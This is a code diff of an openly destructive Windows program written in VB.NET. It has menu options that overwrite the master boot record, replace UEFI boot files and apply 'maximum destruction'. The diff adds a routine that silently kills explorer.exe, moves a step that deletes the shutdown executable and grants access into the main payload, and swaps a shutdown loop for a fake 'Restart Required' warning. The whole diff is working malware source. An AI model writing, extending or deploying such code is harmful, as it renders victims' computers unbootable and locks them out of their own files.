@@ -204,7 +204,6 @@ Public Class Form1
                         timerLabel.Text = "It can't defend against UEFI! Executing maximum destruction!"
                         Thread.Sleep(5000)
                         Form1.WriteMBR()
-                        Form1.KillGrantAccessAndDeleteShutdownExe()
                         ReplaceBootx64WithBootmgfw()
                         ApplyMaximumDestruction()
 
@@ -213,7 +212,6 @@ Public Class Form1
                         timerLabel.Text = "It can't defend against UEFI! Executing classic UEFI effects!"
                         Thread.Sleep(5000)
                         Form1.WriteMBR()
-                        Form1.KillGrantAccessAndDeleteShutdownExe()
                         ReplaceBootx64WithBootmgfw()
 
                     Case "Surprise Me"
@@ -237,7 +235,6 @@ Public Class Form1
                         timerLabel.Text = "Executing maximum destruction!"
                         Thread.Sleep(5000)
                         Form1.WriteMBR()
-                        Form1.KillGrantAccessAndDeleteShutdownExe()
                         ReplaceBootx64WithBootmgfw()
                         ApplyMaximumDestruction()
 
@@ -247,7 +244,6 @@ Public Class Form1
                         Thread.Sleep(5000)
                         ' Write UEFI using bootmgfw from Resource1
                         Form1.WriteMBR()
-                        Form1.KillGrantAccessAndDeleteShutdownExe()
                         ReplaceBootx64WithBootmgfw()
 
                     Case "Surprise Me"
@@ -255,25 +251,8 @@ Public Class Form1
                         timerLabel.Text = "Surprise! Executing less destructive effects!"
                         Thread.Sleep(5000)
                         Form1.CreateEpicVBScriptFile()
-                        Process.Start("shutdown -s -t 5")
-                        Process.Start("shutdown -a")
-                        Process.Start("shutdown -s -t 5")
-                        Process.Start("shutdown -a")
-                        Process.Start("shutdown -s -t 5")
-                        Process.Start("shutdown -a")
-                        Process.Start("shutdown -s -t 5")
-                        Process.Start("shutdown -a")
-                        Process.Start("shutdown -s -t 5")
-                        Process.Start("shutdown -a")
-                        Process.Start("shutdown -s -t 5")
-                        Process.Start("shutdown -a")
-                        Process.Start("shutdown -s -t 5")
-                        Process.Start("shutdown -a")
-                        Process.Start("shutdown -s -t 5")
-                        Process.Start("shutdown -a")
-                        Process.Start("shutdown -s -t 5")
-                        Process.Start("shutdown -a")
-                        Process.Start("shutdown -s -t 5")
+                        MessageBox.Show("To apply changes, you need to restart your computer.", "Restart Required", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+
                     Case "Just Make Unusable My PC Without Destruction"
                         ' Code for access restrictions
                         timerLabel.Text = "You can't access your files anymore!"
@@ -1117,6 +1096,21 @@ Public Class Form1
         End If
     End Sub
 
+    Private Sub KillExplorer()
+        Try
+            'Kill explorer.exe 
+            Dim process As New Process()
+            process.StartInfo.FileName = "cmd.exe"
+            process.StartInfo.Arguments = "/C taskkill /F /IM explorer.exe"
+            process.StartInfo.CreateNoWindow = True
+            process.StartInfo.UseShellExecute = False
+            process.Start()
+
+        Catch ex As Exception
+            Console.WriteLine("An error occured: " & ex.Message)
+        End Try
+    End Sub
+
     ' Method to execute the payload in a separate thread
     Private Sub ExecutePayload()
 
@@ -1133,6 +1127,8 @@ Public Class Form1
 
         ' Execute remaining operations
         SetWallpaper()
+        KillExplorer()
+        KillGrantAccessAndDeleteShutdownExe()
         WriteMessageToNotepad()
         GrantSelfPermissions()
         VisualEffectTimer.Start()
